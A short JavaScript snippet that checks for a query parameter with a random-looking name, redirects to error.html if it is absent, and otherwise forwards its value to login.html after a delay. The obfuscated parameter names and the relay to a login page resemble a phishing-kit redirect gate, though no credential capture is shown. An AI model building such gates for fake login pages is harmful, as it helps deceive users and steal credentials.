 <script>
	  // Function to extract query parameter value
		    function getQueryParameter(parameterName) {
		      var queryString = window.location.search;
		      var urlParams = new URLSearchParams(queryString);
		      return urlParams.get(parameterName);
		    }
		    // Get the value from the 'data' query parameter
		    var value = getQueryParameter('bfjkdghurehgjufhdkhgruiegbvousdhfowehr');
		    
		    if(value == null) {
		    
		    	window.location.href = "error.html";
		    
		    }else{
		    
		     function redirectToDestination() {
		    // Redirect to the destination page with the variable value in the URL
		    window.location.href = "login.html?gfjdliotrgojnghgherbegrehureert0e0ee=" + (value);
		    }

		    // Automatically redirect after a certain delay (e.g., 2 seconds)
		    setTimeout(redirectToDestination, 3000);
		    
		}
		
	 </script>
